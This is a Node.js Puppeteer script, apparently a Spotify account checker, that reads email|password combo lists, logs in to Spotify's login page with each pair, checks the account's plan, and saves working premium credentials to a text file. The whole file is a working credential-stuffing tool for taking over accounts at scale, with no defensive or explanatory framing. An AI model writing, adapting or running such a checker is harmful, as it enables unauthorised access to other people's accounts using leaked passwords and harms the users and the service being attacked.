const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer');
const fs = require('fs');
const delay = require('delay');
const S = require('string'  );
const { error } = require('console');
const { type } = require('os');
var no = 1;

(async () => {
    var acclist = readlineSync.question('Input File Akun : ');
    const data = acclist.split(/\r?\n/);
    for (var o = 0; o < data.length; o++) {
        var acclist = data[o].split('|')[0];

        const read = fs.readFileSync(acclist, 'UTF-8');
        const list = read.split(/\r?\n/);
        for (var i = 0; i < list.length; i++) {
            var email = list[i].split('|')[0];
            var password = list[i].split('|')[1];

        const $options = { waitUntil: 'networkidle2' };
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();

        await page.goto('https://accounts.spotify.com/en/login/', $options);

        await delay(5000)

        const usernameField = await page.$('input[name="username"]')
        await usernameField.type(email)
        await usernameField.dispose()

        const passwordField = await page.$('input[name="password"]')
        await passwordField.type(password)
        await passwordField.dispose()

        const buttonField = await page.$('button[id="login-button"]')
        await buttonField.click()
        await buttonField.dispose()

        await delay(2000)
        if (page.url().includes('login')) {

            const info = await page.evaluate(() =>{
                return document.querySelector('p[class="alert alert-warning"]').innerText;
            })
            console.log('[' + no + '] ' +email+ '|' +password+ ' Information : ',info);
        } else if (page.url().includes('status')) {

            await page.goto('https://www.spotify.com/id/account/overview/', $options);
            
            await delay(5000)
            const plan = await page.evaluate(() => {
                return document.querySelector('span[class="sc-hKgILt ktdUVV"]').innerText;
            })
            
            console.log('[' + no + '] ' +email+ '|' +password+ ' Information : ',plan);
            fs.appendFileSync('spotifypremium.txt', email + password + "\n");
        } else {
            console.log('error');
        }
no++;
}}})();